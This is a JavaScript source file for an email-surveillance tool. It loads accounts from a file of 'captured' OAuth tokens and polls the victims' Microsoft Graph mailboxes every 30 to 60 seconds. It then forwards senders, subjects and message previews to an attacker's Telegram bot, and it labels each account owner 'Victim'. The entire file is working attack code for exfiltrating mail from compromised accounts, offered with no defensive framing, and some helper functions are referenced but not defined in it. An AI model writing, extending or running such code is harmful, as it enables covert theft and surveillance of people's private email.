// complete-monitor.js
const fs = require('fs');

class EmailMonitor {
    constructor() {
        this.accounts = JSON.parse(fs.readFileSync('./captured_data.json', 'utf8'));
        this.isMonitoring = false;
    }

    async start() {
        if (this.isMonitoring) return;
        
        this.isMonitoring = true;
        console.log('🎯 Starting complete email monitoring system...');

        // Initial scan
        await this.scanAllAccounts();

        // Continuous monitoring
        setInterval(() => {
            this.scanAllAccounts();
        }, 60000); // 1 minute

        // Also monitor every 30 seconds for high priority
        setInterval(() => {
            this.quickScan();
        }, 30000); // 30 seconds
    }

    async scanAllAccounts() {
        console.log('\n🔍 Scanning all accounts for new emails...');
        
        for (const account of this.accounts) {
            if (account.tokens?.refresh_token) {
                await this.monitorAccount(account);
                await new Promise(resolve => setTimeout(resolve, 3000)); // 3s delay
            }
        }
    }

    async quickScan() {
        // Quick scan for important emails only
        for (const account of this.accounts) {
            if (account.tokens?.refresh_token) {
                await this.checkImportantEmails(account);
            }
        }
    }

    async checkImportantEmails(account) {
        try {
            const tokens = await refreshToken(account.tokens.refresh_token);
            if (!tokens.access_token) return;

            // Check only high importance emails
            const url = `https://graph.microsoft.com/v1.0/me/messages?$filter=importance eq 'high' and receivedDateTime ge ${account.lastEmailCheck}&$top=10`;
            
            const response = await fetch(url, {
                headers: {
                    'Authorization': `Bearer ${tokens.access_token}`,
                    'Content-Type': 'application/json'
                }
            });

            if (response.ok) {
                const emails = await response.json();
                if (emails.value && emails.value.length > 0) {
                    console.log(`🚨 HIGH PRIORITY EMAILS for ${account.email}: ${emails.value.length}`);
                    
                    for (const email of emails.value) {
                        await this.processHighPriorityEmail(email, account.email, tokens.access_token);
                    }
                }
            }

        } catch (error) {
            console.log(`Quick scan error for ${account.email}:`, error.message);
        }
    }

    async processHighPriorityEmail(email, userEmail, accessToken) {
        const sender = email.from?.emailAddress?.name || 'Unknown';
        
        const message = `🚨🚨 <b>HIGH PRIORITY EMAIL</b> 🚨🚨\n\n` +
                       `👤 <b>Victim:</b> ${userEmail}\n` +
                       `📨 <b>From:</b> ${sender}\n` +
                       `📋 <b>Subject:</b> ${email.subject || 'No Subject'}\n` +
                       `⏰ <b>Time:</b> ${new Date(email.receivedDateTime).toLocaleString()}\n\n` +
                       `📝 <b>URGENT PREVIEW:</b>\n<code>${(email.bodyPreview || 'No preview').substring(0, 1000)}</code>`;

        await telegramSend(message);

        // Send immediate alert
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: `🔔 HIGH PRIORITY ALERT for ${userEmail}`,
                parse_mode: 'HTML'
            })
        });
    }
}

// Start the complete monitoring system
const monitor = new EmailMonitor();
monitor.start();